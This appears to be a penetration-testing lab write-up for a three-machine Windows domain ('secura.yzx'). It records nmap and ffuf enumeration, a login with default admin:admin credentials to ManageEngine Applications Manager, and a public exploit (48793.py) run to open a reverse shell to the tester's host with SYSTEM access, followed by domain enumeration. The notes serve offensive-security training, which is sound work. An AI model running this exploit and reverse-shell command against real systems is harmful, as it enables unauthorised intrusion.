Three-machine enterprise environment

## Objectives
- Exploit vulnerabilities in ManageEngine
- Pivot through internal services
- Leverage insecure GPO permissions to escalate privileges
- Compromise the domain

# Domain
- dc01

**Name**
- secura.yzx

**Users**
- charlotte
- michael
- 

# 192.168.184.95

proof.txt - b0624467dd801d947277061ea5e6bb70

## Nmap Scan

#### Open Ports
```bash
nmap -v -p- --max-scan-delay=0 -oN 96/all_ports.txt 192.168.184.95
	PORT      STATE SERVICE
	135/tcp   open  msrpc
	139/tcp   open  netbios-ssn
	445/tcp   open  microsoft-ds
	5001/tcp  open  commplex-link
	5040/tcp  open  unknown
	5985/tcp  open  wsman
	8443/tcp  open  https-alt
	12000/tcp open  cce4x
	44444/tcp open  cognex-dataman
	47001/tcp open  winrm
	49664/tcp open  unknown
	...
	49672/tcp open  unknown
	54233/tcp open  unknown
	54234/tcp open  unknown
	57499/tcp open  unknown
	57528/tcp open  unknown
```

#### Version & Default Scripts
```bash
nmap -v -sV -sC -p 135,139,445,5001,5040,5985,8443,12000,44444,47001,49664-49672,54233,54234,57499,57528 -oN 95/open_sVsC.txt 192.168.184.95

	PORT      STATE SERVICE         VERSION
	135/tcp   open  msrpc           Microsoft Windows RPC
	139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds?
	5001/tcp  open  commplex-link?
	| fingerprint-strings: 
	|   SIPOptions: 
	|     HTTP/1.1 200 OK
	|     Content-Type: text/html; charset=ISO-8859-1
	|     Content-Length: 132
	|_    MAINSERVER_RESPONSE:<serverinfo method="setserverinfo" mainserver="5001" webserver="44444" pxyname="192.168.45.151" startpage=""/>
	5040/tcp  open  unknown
	5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-title: Not Found
	|_http-server-header: Microsoft-HTTPAPI/2.0
	8443/tcp  open  ssl/https-alt   AppManager
	|_ssl-date: 2024-10-04T21:10:47+00:00; +23s from scanner time.
	| http-methods: 
	|_  Supported Methods: GET POST
	|_http-title: Site doesn''t have a title (text/html).
	|_http-favicon: Unknown favicon MD5: CF9934E74D25878ED70B430915D931ED
	| ssl-cert: Subject: commonName=APPLICATIONSMANAGER/organizationName=WebNMS/stateOrProvinceName=Pleasanton/countryName=US
	| Issuer: commonName=APPLICATIONSMANAGER/organizationName=WebNMS/stateOrProvinceName=Pleasanton/countryName=US
	| Public Key type: rsa
	| Public Key bits: 2072
	| Signature Algorithm: sha256WithRSAEncryption
	| Not valid before: 2019-02-27T11:03:03
	| Not valid after:  2050-02-27T11:03:03
	| MD5:   094c:a4e7:2020:ec73:1e9f:e5ed:e0ea:5939
	|_SHA-1: 834c:a871:c377:20d8:49bd:73d4:0660:b8a8:9a6a:df17
	|_http-server-header: AppManager
	| fingerprint-strings: 
	|   FourOhFourRequest: 
	|     HTTP/1.1 404 
	|     Set-Cookie: JSESSIONID_APM_44444=D241E712005F1007093B06D49B69E9E7; Path=/; Secure; HttpOnly
	|     Content-Type: text/html;charset=UTF-8
	|     Content-Length: 973
	|     Date: Fri, 04 Oct 2024 21:06:59 GMT
	|     Connection: close
	|     Server: AppManager
	|     <!DOCTYPE html>
	|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
	|     <html>
	|     <head>
	|     <title>Applications Manager</title>
	|     <link REL="SHORTCUT ICON" HREF="/favicon.ico">
	|     <!-- Includes commonstyle CSS and dynamic style sheet bases on user selection -->
	|     <link href="/images/commonstyle.css?rev=14440" rel="stylesheet" type="text/css">
	|     <link href="/images/newUI/newCommonstyle.css?rev=14260" rel="stylesheet" type="text/css">
	|     <link href="/images/Grey/style.css?rev=14030" rel="stylesheet" type="text/css">
	|     <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
	|     </head>
	|     <body bgcolor="#FFFFFF" leftmarg
	|   GetRequest: 
	|     HTTP/1.1 200 
	|     Set-Cookie: JSESSIONID_APM_44444=BFF7138A476CEFB2A186528223679C18; Path=/; Secure; HttpOnly
	|     Accept-Ranges: bytes
	|     ETag: W/"261-1591621693000"
	|     Last-Modified: Mon, 08 Jun 2020 13:08:13 GMT
	|     Content-Type: text/html
	|     Content-Length: 261
	|     Date: Fri, 04 Oct 2024 21:06:59 GMT
	|     Connection: close
	|     Server: AppManager
	|     <!-- $Id$ -->
	|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
	|     <html>
	|     <head>
	|     <!-- This comment is for Instant Gratification to work applications.do -->
	|     <script>
	|     window.open("/webclient/common/jsp/home.jsp", "_top");
	|     </script>
	|     </head>
	|     </html>
	|   HTTPOptions: 
	|     HTTP/1.1 403 
	|     Set-Cookie: JSESSIONID_APM_44444=12DFCD8A8B51EC270867F1E23B775B74; Path=/; Secure; HttpOnly    # NOTE -> Follows info we get for port 44444
	...
	12000/tcp open  cce4x?
	44444/tcp open  cognex-dataman?
	| fingerprint-strings: 
	|   GetRequest: 
	|     HTTP/1.1 200 
	|     Set-Cookie: JSESSIONID_APM_44444=269CC0F0F745522FEB8406F313710AC3; Path=/; HttpOnly
	|     Accept-Ranges: bytes
	|     ETag: W/"261-1591621693000"
	|     Last-Modified: Mon, 08 Jun 2020 13:08:13 GMT
	|     Content-Type: text/html
	|     Content-Length: 261
	|     Date: Fri, 04 Oct 2024 21:06:58 GMT
	|     Connection: close
	|     Server: AppManager
	|     <!-- $Id$ -->
	|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
	|     <html>
	|     <head>
	|     <!-- This comment is for Instant Gratification to work applications.do -->
	|     <script>
	|     window.open("/webclient/common/jsp/home.jsp", "_top");
	|     </script>
	|     </head>
	|     </html>
	|   ...
	|   RTSPRequest: 
	|     HTTP/1.1 505 
	|     vary: accept-encoding
	|     Content-Type: text/html;charset=utf-8
	|     Content-Language: en
	|     Content-Length: 2142
	|     Date: Fri, 04 Oct 2024 21:06:58 GMT
	|     Server: AppManager
	|     <!doctype html><html lang="en"><head><title>HTTP Status 505 
	|_    HTTP Version Not Supported</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#
	47001/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-server-header: Microsoft-HTTPAPI/2.0
	|_http-title: Not Found
	49664/tcp open  msrpc           Microsoft Windows RPC
	49665/tcp open  msrpc           Microsoft Windows RPC
	49666/tcp open  msrpc           Microsoft Windows RPC
	49667/tcp open  msrpc           Microsoft Windows RPC
	49668/tcp open  msrpc           Microsoft Windows RPC
	49669/tcp open  msrpc           Microsoft Windows RPC
	49670/tcp open  msrpc           Microsoft Windows RPC
	49671/tcp open  msrpc           Microsoft Windows RPC
	49672/tcp open  tcpwrapped
	54233/tcp open  unknown
	| fingerprint-strings: 
	|   SMBProgNeg, X11Probe: 
	|_    CLOSE_SESSION
	54234/tcp open  unknown
	| fingerprint-strings: 
	|   SMBProgNeg, X11Probe: 
	|_    CLOSE_SESSION
	57499/tcp open  java-rmi        Java RMI
	57528/tcp open  unknown
	5 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
	==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
	...
	
	Host script results:
	|_clock-skew: mean: 23s, deviation: 0s, median: 22s
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required
	| smb2-time: 
	|   date: 2024-10-04T21:09:28
	|_  start_date: N/A
```


## Site

![](SECURA_95_site.png)

- Fuzz
```bash
ffuf -u http://192.168.184.95:44444/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -o ffuf_44444.txt

cat ffuf_44444.txt | jq | grep url
      "url": "http://192.168.159.95:44444/images",
      "url": "http://192.168.159.95:44444/bin",
      "url": "http://192.168.159.95:44444/lib",
      "url": "http://192.168.159.95:44444/flash",
      "url": "http://192.168.159.95:44444/backup",
      "url": "http://192.168.159.95:44444/data",
      "url": "http://192.168.159.95:44444/blog",
      "url": "http://192.168.159.95:44444/logs",
      "url": "http://192.168.159.95:44444/common",
      "url": "http://192.168.159.95:44444/classes",
      "url": "http://192.168.159.95:44444/template",
      "url": "http://192.168.159.95:44444/help",
      "url": "http://192.168.159.95:44444/resources",
      "url": "http://192.168.159.95:44444/html",
      "url": "http://192.168.159.95:44444/users",
      "url": "http://192.168.159.95:44444/support",
      "url": "http://192.168.159.95:44444/mobile",
      "url": "http://192.168.159.95:44444/reports",
      "url": "http://192.168.159.95:44444/conf",
      "url": "http://192.168.159.95:44444/maps",
      "url": "http://192.168.159.95:44444/icons",
      "url": "http://192.168.159.95:44444/projects",
      "url": "http://192.168.159.95:44444/custom",
      "url": "http://192.168.159.95:44444/Reports",
      "url": "http://192.168.159.95:44444/mysql",
      "url": "http://192.168.159.95:44444/toolbar",
      "url": "http://192.168.159.95:44444/Agent",
      "url": "http://192.168.159.95:44444/apache",
      "url": "http://192.168.159.95:44444/",
      "url": "http://192.168.159.95:44444/Cert",
      "url": "http://192.168.159.95:44444/discovery",
      "url": "http://192.168.159.95:44444/j_security_check"
```


- Default creds `admin:admin` work
![](SECURA_95_site_about.png)

- Searchsploit
```bash
searchsploit manage engine application manager 14
	---------------------------------------------------------------------------------------- ---------------------------------
	 Exploit Title                                                                          |  Path
	---------------------------------------------------------------------------------------- ---------------------------------
	Manage Engine Application Manager 12.5 - Arbitrary Command Execution                    | multiple/webapps/39236.py
	Manage Engine Applications Manager 12 - Multiple Vulnerabilities                        | multiple/webapps/39235.txt
	ManageEngine Application Manager 14.2 - Privilege Escalation / Remote Command Execution | multiple/remote/47228.rb
	ManageEngine Applications Manager 11.0 < 14.0 - SQL Injection / Remote Code Execution ( | windows/remote/46725.rb
	ManageEngine Applications Manager 14.0 - Authentication Bypass / Remote Command Executi | multiple/remote/46740.rb
	ManageEngine Applications Manager 14700 - Remote Code Execution (Authenticated)         | java/webapps/48793.py
	ManageEngine OpManager / Applications Manager / IT360 - 'FailOverServlet' Multiple Vuln | multiple/webapps/43894.txt
	---------------------------------------------------------------------------------------- ---------------------------------
	Shellcodes: No Results
	Papers: No Results
```


## Reverse Shell

- Using 48793.py
	- `sudo apt update && sudo apt install default-jdk`
	- `sed -i 's/release 7/release 8/g' 48793.py`
```bash
python3 48793.py http://192.168.184.95:44444 admin admin 192.168.45.201 6666 
	[*] Visiting page to retrieve initial cookies...
	[*] Retrieving admin cookie...
	[*] Getting base directory of ManageEngine...
	[*] Found base directory: C:\Program Files\ManageEngine\AppManager14
	[*] Creating JAR file...
	Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
	warning: [options] source value 8 is obsolete and will be removed in a future release
	warning: [options] target value 8 is obsolete and will be removed in a future release
	warning: [options] To suppress warnings about obsolete options, use -Xlint:-options.
	3 warnings
	Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
	added manifest
	adding: weblogic/jndi/Environment.class(in = 1844) (out= 1098)(deflated 40%)
	[*] Uploading JAR file...
	[*] Attempting to upload JAR directly to targeted Weblogic folder...
	[!] Failed to upload JAR directly, continue to add and execute job to move JAR...
	[*] Creating a task to move the JAR file to relative path: classes/weblogic/version8/...
	[*] Found actionname: move_weblogic_jar3864 with found actionid 10000003
	[*] Executing created task with id: 10000003 to copy JAR...
	[*] Task 10000003 has been executed successfully
	[*] Deleting created task as JAR has been copied...
	[*] Running the Weblogic credentialtest which triggers the code in the JAR...
	[*] Check your shell...
```
	- Got a shell.   NOTE:  Attack didn't work initially.  Came back after a couple days and it suddenly did

```powershell
whoami
	nt authority\system

cd C:\

dir /s proof.txt
	Volume in drive C has no label.
	 Volume Serial Number is A878-B85B
	
	 Directory of C:\Users\Administrator\Desktop
	
	10/09/2024  09:40 PM                34 proof.txt
	               1 File(s)             34 bytes
	
	     Total Files Listed:
	               1 File(s)             34 bytes
	               0 Dir(s)  16,780,812,288 bytes free

type c:\users\administrator\desktop\proof.txt
	b0624467dd801d947277061ea5e6bb70
```


## Further enumeration


- Domain Users
```powershell
net user /domain
	The request will be processed at a domain controller for domain secura.yzx.
	
	User accounts for \\dc01.secura.yzx
	-------------------------------------------------------------------------------
	Administrator            charlotte                DefaultAccount           
	Guest                    krbtgt                   michael                  
	The command completed with one or more errors.


net user charlotte /domain
	The request will be processed at a domain controller for domain secura.yzx.
	
	User name                    charlotte
	Full Name                    charlotte
	Comment                      
	User's comment               
	Country/region code          000 (System Default)
	Account active               Yes
	Account expires              Never
	
	Password last set            8/5/2022 6:37:50 PM
	Password expires             Never
	Password changeable          8/6/2022 6:37:50 PM
	Password required            Yes
	User may change password     Yes
	
	Workstations allowed         All
	Logon script                 
	User profile                 
	Home directory               
	Last logon                   Never
	
	Logon hours allowed          All
	
	Local Group Memberships      *Remote Management Use
	Global Group memberships     *Domain Users         
	The command completed successfully.


net user michael /domain
	The request will be processed at a domain controller for domain secura.yzx.
	
	User name                    michael
	Full Name                    michael
	Comment                      
	User's comment               
	Country/region code          000 (System Default)
	Account active               Yes
	Account expires              Never
	
	Password last set            8/5/2022 6:36:23 PM
	Password expires             Never
	Password changeable          8/6/2022 6:36:23 PM
	Password required            Yes
	User may change password     Yes
	
	Workstations allowed         All
	Logon script                 
	User profile                 
	Home directory               
	Last logon                   Never
	
	Logon hours allowed          All
	
	Local Group Memberships      
	Global Group memberships     *Domain Users         
	The command completed successfully.
```


- Domain Groups
```powershell
net group /domain
	The request will be processed at a domain controller for domain secura.yzx.
	
	Group Accounts for \\dc01.secura.yzx
	-------------------------------------------------------------------------------
	*Cloneable Domain Controllers
	*DnsUpdateProxy
	*Domain Admins
	*Domain Computers
	*Domain Controllers
	*Domain Guests
	*Domain Users
	*Enterprise Admins
	*Enterprise Key Admins
	*Enterprise Read-only Domain Controllers
	*Group Policy Creator Owners
	*Key Admins
	*Protected Users
	*Read-only Domain Controllers
	*Schema Admins
	The command completed with one or more errors.
```


- Domain Shares
```powershell
net view \\dc01 /all
	Shared resources at \\dc01
	
	Share name  Type  Used as  Comment              
	-------------------------------------------------------------------------------
	ADMIN$      Disk           Remote Admin         
	C$          Disk           Default share        
	IPC$        IPC            Remote IPC           
	NETLOGON    Disk           Logon server share   
	SYSVOL      Disk           Logon server share   
	test        Disk                                
	The command completed successfully.
```
	- `dc01` was discovered during nmap -sV scan of .97




# 192.168.184.96

## Nmap Scan

#### Open Ports
```bash
nmap -v -p- --max-scan-delay=0 -oN 96/all_ports.txt 192.168.184.96
	PORT      STATE SERVICE
	135/tcp   open  msrpc
	139/tcp   open  netbios-ssn
	445/tcp   open  microsoft-ds
	3306/tcp  open  mysql
	5040/tcp  open  unknown
	5985/tcp  open  wsman
	7680/tcp  open  pando-pub
	47001/tcp open  winrm
	49664/tcp open  unknown
	49665/tcp open  unknown
	49666/tcp open  unknown
	49667/tcp open  unknown
	49668/tcp open  unknown
	49669/tcp open  unknown
	49670/tcp open  unknown
	49671/tcp open  unknown
```

#### Version & Default Scripts
```bash
nmap -v -sV -sC 192.168.184.96 -p 135,139,445,3306,5040,5985,7680,47001,49664-49671 -oN open_sVsC.txt  
	PORT      STATE SERVICE       VERSION
	135/tcp   open  msrpc         Microsoft Windows RPC
	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds?
	3306/tcp  open  mysql?
	| fingerprint-strings: 
	|   NotesRPC: 
	|_    Host '192.168.45.201' is not allowed to connect to this MariaDB server
	5040/tcp  open  unknown
	5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-title: Not Found
	|_http-server-header: Microsoft-HTTPAPI/2.0
	7680/tcp  open  pando-pub?
	47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-title: Not Found
	|_http-server-header: Microsoft-HTTPAPI/2.0
	49664/tcp open  msrpc         Microsoft Windows RPC
	49665/tcp open  msrpc         Microsoft Windows RPC
	49666/tcp open  msrpc         Microsoft Windows RPC
	49667/tcp open  msrpc         Microsoft Windows RPC
	49668/tcp open  msrpc         Microsoft Windows RPC
	49669/tcp open  msrpc         Microsoft Windows RPC
	49670/tcp open  msrpc         Microsoft Windows RPC
	49671/tcp open  msrpc         Microsoft Windows RPC
	1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
	SF-Port3306-TCP:V=7.94SVN%I=7%D=10/9%Time=6706FF5E%P=x86_64-pc-linux-gnu%r
	SF:(NotesRPC,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.45\.201'\x20is\x20no
	SF:t\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required
	|_clock-skew: 27s
	| smb2-time: 
	|   date: 2024-10-09T22:13:31
	|_  start_date: N/A
	
	NSE: Script Post-scanning.
	Initiating NSE at 18:13
	Completed NSE at 18:13, 0.00s elapsed
	Initiating NSE at 18:13
	Completed NSE at 18:13, 0.00s elapsed
	Initiating NSE at 18:13
	Completed NSE at 18:13, 0.00s elapsed
	Read data files from: /usr/bin/../share/nmap
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 175.37 seconds
```



# 192.168.184.97

Domain: secura.yzx

#### Open Ports
```bash
nmap -v -p- -Pn --max-scan-delay=0 -oN 97/all_ports.txt 192.168.184.97
	PORT      STATE SERVICE
	53/tcp    open  domain
	88/tcp    open  kerberos-sec
	135/tcp   open  msrpc
	139/tcp   open  netbios-ssn
	389/tcp   open  ldap
	445/tcp   open  microsoft-ds
	464/tcp   open  kpasswd5
	593/tcp   open  http-rpc-epmap
	636/tcp   open  ldapssl
	3268/tcp  open  globalcatLDAP
	3269/tcp  open  globalcatLDAPssl
	5985/tcp  open  wsman
	9389/tcp  open  adws
	49665/tcp open  unknown
	49666/tcp open  unknown
	49668/tcp open  unknown
	49677/tcp open  unknown
	49678/tcp open  unknown
	49681/tcp open  unknown
	49708/tcp open  unknown
	49814/tcp open  unknown
```

#### Version & Default Scripts
```bash
nmap -Pn -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49665,49666,49668,49677,49678,49681,49708,49814 -oN 97/open_sVsC.txt 192.168.184.97
	PORT      STATE SERVICE      VERSION
	53/tcp    open  domain       Simple DNS Plus
	88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-04 21:11:46Z)
	135/tcp   open  msrpc        Microsoft Windows RPC
	139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
	389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: secura.yzx, Site: Default-First-Site-Name)
	445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: SECURA)
	464/tcp   open  kpasswd5?
	593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
	636/tcp   open  tcpwrapped
	3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: secura.yzx, Site: Default-First-Site-Name)
	3269/tcp  open  tcpwrapped
	5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-server-header: Microsoft-HTTPAPI/2.0
	|_http-title: Not Found
	9389/tcp  open  mc-nmf       .NET Message Framing
	49665/tcp open  msrpc        Microsoft Windows RPC
	49666/tcp open  msrpc        Microsoft Windows RPC
	49668/tcp open  msrpc        Microsoft Windows RPC
	49677/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
	49678/tcp open  msrpc        Microsoft Windows RPC
	49681/tcp open  msrpc        Microsoft Windows RPC
	49708/tcp open  msrpc        Microsoft Windows RPC
	49814/tcp open  msrpc        Microsoft Windows RPC
	Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled and required
	|_clock-skew: mean: 24s, deviation: 1s, median: 23s
	| smb2-time: 
	|   date: 2024-10-04T21:12:37
	|_  start_date: 2024-09-27T21:51:05
	| smb-os-discovery: 
	|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
	|   Computer name: dc01
	|   NetBIOS computer name: DC01\x00
	|   Domain name: secura.yzx                       # NOTE!
	|   Forest name: secura.yzx                       # NOTE!
	|   FQDN: dc01.secura.yzx                         # NOTE!
	|_  System time: 2024-10-04T21:12:38+00:00
	| smb-security-mode: 
	|   account_used: <blank>
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: required
```

